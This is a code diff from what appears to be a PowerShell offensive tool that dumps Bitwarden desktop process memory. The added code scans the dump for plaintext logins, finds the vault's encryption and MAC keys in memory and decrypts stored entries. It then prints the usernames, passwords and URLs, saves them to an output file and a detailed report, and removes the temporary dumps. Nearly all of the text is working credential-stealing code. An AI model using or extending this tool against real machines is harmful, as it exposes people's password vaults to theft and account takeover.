+        $allCryptoDecrypted += @{ Decrypted = $allDecrypted; Values = $decryptedValues; CipherCreds = $cipherCreds; Remaining = $remaining.Count; Total = $encStrings.Count }
+
+        Write-Status "Crypto: $($allDecrypted.Count)/$($encStrings.Count) decrypted" "good"
+    }
+
+    # Clean up temp dumps (unless -SaveDump)
+    foreach ($dmpFile in $dumpFiles) {
+        if (-not $DoSaveDump) {
+            try { Remove-Item $dmpFile -Force -ErrorAction SilentlyContinue } catch {}
+        }
+    }
+
+    # ── Output ──────────────────────────────────────────────────────────
     Write-Status "EXTRACTED CREDENTIALS" "header"
-    if ($unique.Count -gt 0) {
+
+    # Structured cipher creds from crypto
+    $allCipherCreds = @()
+    $allUniqueValues = @()
+    foreach ($cr in $allCryptoDecrypted) {
+        $allCipherCreds += $cr.CipherCreds
+        $allUniqueValues += @($cr.Values.Values | Sort-Object -Unique | Where-Object { $_.Trim().Length -gt 0 })
+    }
+    $allUniqueValues = @($allUniqueValues | Sort-Object -Unique)
+
+    if ($allCipherCreds.Count -gt 0) {
+        Write-Status "STRUCTURED CREDENTIALS (decrypted from vault)" "header"
         $i = 0
-        foreach ($cred in $unique) {
+        foreach ($cred in $allCipherCreds) {
+            $i++
+            Write-Host ""
+            Write-Host "  [$i] " -NoNewline -ForegroundColor Green
+            if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Decrypted)" -ForegroundColor DarkGray } else { Write-Host "" }
+            if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
+            if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
+            if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
+        }
+        Write-Host ""
+    }
+
+    if ($plaintextCreds.Count -gt 0) {
+        Write-Status "PLAINTEXT CREDENTIALS (from memory)" "header"
+        $i = 0
+        foreach ($cred in $plaintextCreds) {
             $i++
             Write-Host ""
             Write-Host "  [$i] " -NoNewline -ForegroundColor Green
@@ -934,11 +1612,45 @@ function Invoke-BWDump {
             if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
         }
         Write-Host ""
-        Write-Status "Found $($unique.Count) credential(s) in memory" "good"
-        Save-Results -Credentials $unique -OutputFile $OutFile
-    } else {
+    }
+
+    if ($allUniqueValues.Count -gt 0) {
+        Write-Status "ALL DECRYPTED VALUES ($($allUniqueValues.Count) unique)" "header"
+        $vi = 0
+        foreach ($val in $allUniqueValues) {
+            $vi++
+            $color = "White"
+            if ($val -match '^https?://') { $color = "Gray" }
+            elseif ($val -match '@') { $color = "Cyan" }
+            elseif ($val.Length -ge 6 -and $val -match '[A-Z]' -and $val -match '[a-z]' -and $val -match '\d') { $color = "Yellow" }
+            Write-Host "  [$vi] $val" -ForegroundColor $color
+        }
+        Write-Host ""
+    }
+
+    # Summary
+    foreach ($cr in $allCryptoDecrypted) {
+        Write-Status "Crypto summary: $($cr.Decrypted.Count)/$($cr.Total) decrypted, $($cr.Remaining) remaining" "info"
+    }
+
+    # Save all results
+    $allCreds = @()
+    $allCreds += $allCipherCreds
+    $allCreds += $plaintextCreds
+    foreach ($val in $allUniqueValues) {
+        $isUrl = $val -match '^https?://'
+        $isEmail = $val -match '@'
+        $allCreds += [PSCustomObject]@{
+            Name = ""; URL = $(if ($isUrl) { $val } else { "" })
+            Username = $(if ($isEmail) { $val } else { "" })
+            Password = $(if (-not $isUrl -and -not $isEmail) { $val } else { "" })
+        }
+    }
+    $allCreds = @($allCreds | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique)
+    if ($allCreds.Count -gt 0) {
+        Save-Results -Credentials $allCreds -OutputFile $OutFile
+    } elseif ($plaintextCreds.Count -eq 0 -and $allUniqueValues.Count -eq 0) {
         Write-Status "No credentials found in process memory" "warn"
-        Write-Status "Vault may be locked, or credentials are encrypted in memory" "info"
     }
 }
 
@@ -1002,25 +1714,23 @@ function Invoke-BWParseDump {
     $fileSize = (Get-Item $DumpFile).Length
     Write-Status "Parsing: $DumpFile ($([math]::Round($fileSize / 1MB, 1))MB)" "info"
 
+    # ── Phase 0: plaintext scan (existing) ──────────────────────────────
+    Write-Status "PHASE 0: Plaintext Credential Scan" "header"
     $credentials = @()
     $chunkSize = 10MB
     $overlap = 4096
     $stream = [System.IO.File]::OpenRead($DumpFile)
     $position = 0
-
     while ($position -lt $fileSize) {
         $readSize = [int][Math]::Min($chunkSize + $overlap, $fileSize - $position)
         $buffer = New-Object byte[] $readSize
         $stream.Position = $position
         $bytesRead = $stream.Read($buffer, 0, $readSize)
         if ($bytesRead -eq 0) { break }
-
         $text = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
         Find-CredentialPatterns -Text $text -Credentials ([ref]$credentials)
-
         $text16 = [System.Text.Encoding]::Unicode.GetString($buffer, 0, $bytesRead)
         Find-CredentialPatterns -Text $text16 -Credentials ([ref]$credentials)
-
         $position += $chunkSize
     }
     $stream.Close()
@@ -1030,11 +1740,158 @@ function Invoke-BWParseDump {
         $_.Username -notmatch $encStrRe -and $_.Password -notmatch $encStrRe -and
         $_.Password.Length -lt 300 -and $_.Username.Length -lt 200
     }
-    $unique = $filtered | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique
+    $plaintextCreds = @($filtered | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique)
+    if ($plaintextCreds.Count -gt 0) {
+        Write-Status "Found $($plaintextCreds.Count) plaintext credential(s)" "good"
+    } else {
+        Write-Status "No plaintext credentials (vault likely locked)" "info"
+    }
+
+    # ── Phase 1: EncString extraction ───────────────────────────────────
+    Write-Status "PHASE 1: EncString Extraction" "header"
+    $logAction = [System.Action[string]]{ param($msg) Write-Status $msg "info" }
+    $encStrings = [BW.DumpCrypto]::ExtractEncStrings($DumpFile)
+    Write-Status "Extracted $($encStrings.Count) unique EncStrings" $(if ($encStrings.Count -gt 0) {"good"} else {"warn"})
+
+    if ($encStrings.Count -eq 0) {
+        Write-Status "No EncStrings found — cannot perform crypto extraction" "warn"
+        if ($plaintextCreds.Count -gt 0) {
+            Write-Status "EXTRACTED CREDENTIALS (plaintext only)" "header"
+            $i = 0
+            foreach ($cred in $plaintextCreds) {
+                $i++
+                Write-Host ""
+                Write-Host "  [$i] " -NoNewline -ForegroundColor Green
+                if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Memory)" -ForegroundColor DarkGray } else { Write-Host "" }
+                if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
+                if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
+                if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
+            }
+            Save-Results -Credentials $plaintextCreds -OutputFile $OutFile
+        }
+        return
+    }
+
+    # ── Phase 2: Crypto key discovery ───────────────────────────────────
+    Write-Status "PHASE 2: Crypto Key Discovery" "header"
+    $allDecrypted = [System.Collections.Generic.List[object]]::new()
+    $remaining = $encStrings
+    $keyRound = 0
+    $previousMacKey = $null
+
+    while ($remaining.Count -ge 2) {
+        $keyRound++
+        $keyLabel = "Key#$keyRound"
+        Write-Status "Searching for $keyLabel ($($remaining.Count) EncStrings)..." "info"
+
+        $foundKey = $null
+        if ($keyRound -eq 1) {
+            $foundKey = [BW.DumpCrypto]::FindKeys($DumpFile, $remaining, $logAction)
+        } else {
+            $foundKey = [BW.DumpCrypto]::FindAdditionalKey($DumpFile, $remaining, $previousMacKey, $logAction)
+        }
+
+        if (-not $foundKey) {
+            Write-Status "No more keys found ($($remaining.Count) EncStrings undecryptable)" "warn"
+            break
+        }
+
+        $previousMacKey = $foundKey.MacKey
+        Write-Status "$keyLabel found!" "good"
+        Write-Status "  encKey offset: $($foundKey.EncKeyOffset)" "info"
+        Write-Status "  macKey offset: $($foundKey.MacKeyOffset)" "info"
+        Write-Status "  encKey: $([Convert]::ToBase64String($foundKey.EncKey))" "info"
+        Write-Status "  macKey: $([Convert]::ToBase64String($foundKey.MacKey))" "info"
+        Write-Status "  Matching EncStrings: $($foundKey.MatchedEncStrings)" "info"
+
+        # ── Phase 3: Decryption with found key ─────────────────────────
+        Write-Status "PHASE 3: Decryption (round $keyRound)" "header"
+        $roundResults = [BW.DumpCrypto]::DecryptAll($remaining, $foundKey.EncKey, $foundKey.MacKey, $keyLabel, $logAction)
+        foreach ($entry in $roundResults) { $allDecrypted.Add($entry) }
+        $remaining = [BW.DumpCrypto]::GetRemaining($remaining, $roundResults)
+        Write-Status "Round $keyRound complete: $($roundResults.Count) decrypted, $($remaining.Count) remaining" "info"
+
+        if ($keyRound -ge 5) { break }
+    }
+
+    # ── Phase 4: Extract cipher JSON for structured output ──────────────
+    Write-Status "PHASE 4: Results" "header"
+    $decryptedValues = @{}
+    $perItemKeyB64s = @()
+    foreach ($entry in $allDecrypted) {
+        if ($entry.IsPerItemKey) {
+            $perItemKeyB64s += $entry.Plaintext
+        } else {
+            if ($entry.Plaintext -and $entry.Plaintext.Length -gt 0 -and $entry.Plaintext.Length -lt 1000) {
+                $decryptedValues[$entry.EncString] = $entry.Plaintext
+            }
+        }
+    }
+    $uniqueValues = @($decryptedValues.Values | Sort-Object -Unique | Where-Object { $_.Trim().Length -gt 0 })
+
+    # Try to extract cipher JSON structures for field association
+    $cipherCreds = @()
+    $cipherJsonRe = [regex]::new('"id"\s*:\s*"[0-9a-f-]{36}"[^{}]{0,500}"login"\s*:\s*\{[^{}]{0,2000}\}', [System.Text.RegularExpressions.RegexOptions]::Compiled)
+    $nameRe  = [regex]::new('"name"\s*:\s*"(2\.[^"]+)"')
+    $userRe  = [regex]::new('"username"\s*:\s*"(2\.[^"]+)"')
+    $passRe  = [regex]::new('"password"\s*:\s*"(2\.[^"]+)"')
+    $uriRe   = [regex]::new('"uri"\s*:\s*"(2\.[^"]+)"')
+    $stream2 = [System.IO.File]::OpenRead($DumpFile)
+    $position = 0
+    while ($position -lt $fileSize) {
+        $readSize = [int][Math]::Min(10MB + 8192, $fileSize - $position)
+        $buf = New-Object byte[] $readSize
+        $stream2.Position = $position
+        $br = $stream2.Read($buf, 0, $readSize)
+        if ($br -eq 0) { break }
+        $chunk = [System.Text.Encoding]::ASCII.GetString($buf, 0, $br)
+        foreach ($cm in $cipherJsonRe.Matches($chunk)) {
+            $cj = $cm.Value
+            $nm = $nameRe.Match($cj); $um = $userRe.Match($cj); $pm = $passRe.Match($cj); $urlm = $uriRe.Match($cj)
+            if ($pm.Success -or $um.Success) {
+                $cipherCreds += [PSCustomObject]@{
+                    Name     = if ($nm.Success -and $decryptedValues.ContainsKey($nm.Groups[1].Value)) { $decryptedValues[$nm.Groups[1].Value] } else { "" }
+                    URL      = if ($urlm.Success -and $decryptedValues.ContainsKey($urlm.Groups[1].Value)) { $decryptedValues[$urlm.Groups[1].Value] } else { "" }
+                    Username = if ($um.Success -and $decryptedValues.ContainsKey($um.Groups[1].Value)) { $decryptedValues[$um.Groups[1].Value] } else { "" }
+                    Password = if ($pm.Success -and $decryptedValues.ContainsKey($pm.Groups[1].Value)) { $decryptedValues[$pm.Groups[1].Value] } else { "" }
+                }
+            }
+        }
+        $position += 10MB
+    }
+    $stream2.Close()
+
+    # ── Output ──────────────────────────────────────────────────────────
     Write-Status "EXTRACTED CREDENTIALS" "header"
-    if ($unique.Count -gt 0) {
+    Write-Host ""
+    Write-Status "Total EncStrings: $($encStrings.Count)" "info"
+    Write-Status "Decrypted: $($allDecrypted.Count)" "good"
+    Write-Status "Per-item keys: $($perItemKeyB64s.Count)" "info"
+    Write-Status "Unique plaintext values: $($uniqueValues.Count)" "info"
+    Write-Status "Remaining encrypted: $($remaining.Count)" "warn"
+    Write-Host ""
+
+    # Show structured cipher creds first
+    if ($cipherCreds.Count -gt 0) {
+        Write-Status "STRUCTURED CREDENTIALS (from cipher JSON)" "header"
         $i = 0
-        foreach ($cred in $unique) {
+        foreach ($cred in $cipherCreds) {
+            $i++
+            Write-Host ""
+            Write-Host "  [$i] " -NoNewline -ForegroundColor Green
+            if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Decrypted)" -ForegroundColor DarkGray } else { Write-Host "" }
+            if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
+            if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
+            if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
+        }
+        Write-Host ""
+    }
+
+    # Show plaintext memory creds
+    if ($plaintextCreds.Count -gt 0) {
+        Write-Status "PLAINTEXT CREDENTIALS (from memory)" "header"
+        $i = 0
+        foreach ($cred in $plaintextCreds) {
             $i++
             Write-Host ""
             Write-Host "  [$i] " -NoNewline -ForegroundColor Green
@@ -1044,11 +1901,62 @@ function Invoke-BWParseDump {
             if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
         }
         Write-Host ""
-        Write-Status "Found $($unique.Count) credential(s)" "good"
-        Save-Results -Credentials $unique -OutputFile $OutFile
-    } else {
-        Write-Status "No credentials found in dump file" "warn"
     }
+
+    # Show all unique decrypted values
+    Write-Status "ALL DECRYPTED VALUES ($($uniqueValues.Count) unique)" "header"
+    $vi = 0
+    foreach ($val in $uniqueValues) {
+        $vi++
+        $color = "White"
+        if ($val -match '^https?://') { $color = "Gray" }
+        elseif ($val -match '@') { $color = "Cyan" }
+        elseif ($val.Length -ge 6 -and $val -match '[A-Z]' -and $val -match '[a-z]' -and $val -match '\d') { $color = "Yellow" }
+        Write-Host "  [$vi] $val" -ForegroundColor $color
+    }
+    Write-Host ""
+
+    # Save all results
+    $allCreds = @()
+    $allCreds += $cipherCreds
+    $allCreds += $plaintextCreds
+    foreach ($val in $uniqueValues) {
+        $isUrl = $val -match '^https?://'
+        $isEmail = $val -match '@'
+        $allCreds += [PSCustomObject]@{
+            Name = ""; URL = $(if ($isUrl) { $val } else { "" })
+            Username = $(if ($isEmail) { $val } else { "" })
+            Password = $(if (-not $isUrl -and -not $isEmail) { $val } else { "" })
+        }
+    }
+    $allCreds = @($allCreds | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique)
+    if ($allCreds.Count -gt 0) {
+        Save-Results -Credentials $allCreds -OutputFile $OutFile
+    }
+
+    # Save detailed report
+    $reportPath = [System.IO.Path]::ChangeExtension($OutFile, ".detail.txt")
+    $report = [System.Text.StringBuilder]::new()
+    [void]$report.AppendLine("=== BITWARDEN DUMP DECRYPTION REPORT ===")
+    [void]$report.AppendLine("Dump: $DumpFile ($([math]::Round($fileSize / 1MB, 1))MB)")
+    [void]$report.AppendLine("EncStrings: $($encStrings.Count)")
+    [void]$report.AppendLine("Decrypted: $($allDecrypted.Count)")
+    [void]$report.AppendLine("Per-item keys: $($perItemKeyB64s.Count)")
+    [void]$report.AppendLine("Remaining: $($remaining.Count)")
+    [void]$report.AppendLine("")
+    [void]$report.AppendLine("--- DECRYPTED VALUES ---")
+    foreach ($entry in $allDecrypted) {
+        if (-not $entry.IsPerItemKey) {
+            [void]$report.AppendLine("  [$($entry.KeySource)] $($entry.Plaintext)")
+        }
+    }
+    [void]$report.AppendLine("")
+    [void]$report.AppendLine("--- STILL ENCRYPTED ($($remaining.Count)) ---")
+    foreach ($enc in $remaining) {
+        [void]$report.AppendLine("  $($enc.Substring(0, [Math]::Min(80, $enc.Length)))...")
+    }
+    try { [System.IO.File]::WriteAllText($reportPath, $report.ToString()) } catch {}
+    Write-Status "Detailed report: $reportPath" "info"
 }
 
 # ============================================================================
